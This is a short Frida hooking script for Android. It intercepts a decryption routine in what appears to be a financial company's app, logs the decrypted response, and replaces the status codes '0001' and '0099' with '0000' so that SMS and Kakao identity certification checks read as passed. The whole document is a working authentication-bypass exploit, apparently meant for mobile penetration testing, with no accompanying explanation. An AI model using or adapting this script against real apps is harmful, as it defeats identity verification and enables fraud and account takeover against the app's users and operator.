setImmediate(function(){
	Java.perform(function(){
		var exit_bypass = Java.use("com.financial.companyA.ExampleSolution");
		exit_bypass.ExampleDec.implementation = function(a,b){
			
			var retval = this.ExampleDec(a,b);
			
			var dec = decodeURIComponent(retval);
			
			console.log("\n\x1b[31mretval:\x1b[0m \x1b[34m" + dec + "\x1b[0m");

			if(dec.indexOf('0001')>=0){
				console.log("[*] SMS certification Bypass");
				dec=dec.replace('0001','0000');
			}
			
			if(dec.indexOf('0099')>=0){
				console.log("[*] kakao certification Bypass");
				dec=dec.replace('0099','0000');
			}
			
			console.log("\n\x1b[31mmodify:\x1b[0m \x1b[34m" + dec + "\x1b[0m");
			return dec;

		}
	})
})